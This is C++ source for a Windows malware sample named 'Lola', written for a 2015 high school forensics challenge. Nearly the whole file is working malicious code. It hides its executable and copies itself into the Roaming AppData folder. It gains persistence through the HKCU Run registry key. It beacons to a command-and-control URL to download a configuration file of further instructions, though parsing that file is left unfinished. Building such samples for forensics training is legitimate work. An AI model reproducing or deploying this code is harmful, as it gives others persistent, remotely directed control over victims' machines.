/*
 * Lola Malware
 *
 * Nick Anderson - 2015
 *
 * This malware was written for the 2015 CSAW High School forensics challenge.  The malware
 * will drop to disk, and pull down a file from a C2 server.  The file pulled will contain
 * further instructions for the malware to carry out.
 *
 * TODO: We need to implement the following functionalities
 *	- Beacon to C2
 *    - Keep it easy, let's beacon to socialmalware.io, download a file, and perform an action based on that file
 *  - Persistence
 *    - K.I.S.S. Let's just install autorun registry
 *  - Stealth/Hiding Mech
 *    - Keep this simple, let's just move to APPData under a Microsoft named folder and run
 *  
 *
 */

#include <sstream>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <Shlwapi.h>
#include <ShlObj.h>
#include <urlmon.h>

using namespace std;

wchar_t* ROAMINGAPPDATAEXEC = new wchar_t[MAX_PATH];
wchar_t* ROAMINGAPPDATAPATH = new wchar_t[MAX_PATH];
const LPCSTR C2DOM = "https://www.socialmalware.io/static/hsf/cfg.dat";

/* 
	This functions only job should be to move itself, the exe, to APPDATA
	and relaunch itself

	NOTE: We honestly don't care about return value. If the file already exists
	the CopyData function will fail, however this is the same as if we aren't
	able to write. So we don't do anything with the return value.

	Returns EXIT_FAILURE on fail
	Returns EXIT_SUCCESS on success
*/
int hide(const wchar_t* epath){
	
	int ret = 0;

	/* Set the Hidden Attribute */
	SetFileAttributes(epath,FILE_ATTRIBUTE_HIDDEN);
	
	/* Copy the file to Roaming APPDATA */
	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &ROAMINGAPPDATAPATH) ) )
	{
		wstringstream wss;
		wss << ROAMINGAPPDATAPATH << L"\\lola.exe";
		wstring destPath = wss.str();
		ret = CopyFile(epath, const_cast<LPWSTR>(destPath.c_str()), TRUE);

		/* Save the exe path */
		memset(ROAMINGAPPDATAEXEC, 0x0, sizeof(ROAMINGAPPDATAEXEC));
		for(size_t i = 0; i < destPath.size(); i++){
			ROAMINGAPPDATAEXEC[i] = destPath[i];
		}

		/* TODO: Delete the old file, and transfer execution to the new file.
		note that this is where the result of CopyFile might come in handy, i.e. if
		CopyFile returns FALSE, then we continue the other functionality, if it returns
		TRUE, then we exit after deleting the old file and transfering execution*/

		return EXIT_SUCCESS;
	}
	else
	{
		return EXIT_FAILURE;
	}
}

/*
 * Make Lola persist.  To do this we'll attempt to 
 *
 */
int persist()
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH*2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, ROAMINGAPPDATAEXEC);
	wcscat_s(szValue, count, L"\" ");

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if(fSuccess) // Registry key was successfully created
	{
		dwSize = (wcslen(szValue)+1)*2;
		lResult = RegSetValueExW(hKey, L"lola", 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}
	else
	{
		cerr << "[-] Error creating registry key!" << endl;
		return EXIT_FAILURE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	if (fSuccess)
	{
		return EXIT_SUCCESS;
	}
	return EXIT_FAILURE;
}

int beacon()
{
	HRESULT hRes;
	wchar_t* szDestPath[MAX_PATH];
	memset(szDestPath, 0x0, sizeof(szDestPath));

	if( SUCCEEDED( SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, szDestPath) ) )
	{
		// This is so fucking gross :|
		wstringstream wss;
		wss << ROAMINGAPPDATAPATH << L"\\cfg.dat";
		wstring tmpDestPath = wss.str();
		char destPath[MAX_PATH];
		memset(destPath, 0x0, sizeof(destPath));
		size_t retVal = 0;
		wcstombs_s(&retVal, destPath, tmpDestPath.c_str(), sizeof(destPath));

		/* Get the cfg file from the server */
		hRes = URLDownloadToFileA(NULL, C2DOM, destPath, 0, NULL);

		/* Parse the file to determine what action to take next */

		return EXIT_SUCCESS;
	}

	return EXIT_FAILURE;
}


/* Main :P */
int main(int argc, char* argv[]){
	
	/* locals */
	size_t c2comm = 0;
	size_t convChars = 0;
	wchar_t execPath[MAX_PATH];

	memset(execPath, 0x0, sizeof(execPath));
	mbstowcs_s(&convChars, execPath, argv[0], MAX_PATH); // TODO: This is a bug :P

	/* Hide */
	if( hide(execPath) == EXIT_FAILURE )
	{
		/* Unable to copy exe to APPDATA */
		cerr << "[-] Unable to copy Lola to APPDATA and/or Lola already exists in APPDATA!" << endl;
		return EXIT_FAILURE;
	}

	/* Persist */
	if( persist() )
	{
		cerr << "[-] Lola wasn't able to persist!" << endl;
		return EXIT_FAILURE;
	}

	/* Ask C2 what to do next */
	c2comm = beacon();

	// There's currently a memory leak :P
	//delete ROAMINGAPPDATAEXEC;
	//delete ROAMINGAPPDATAPATH;
	return 0;
}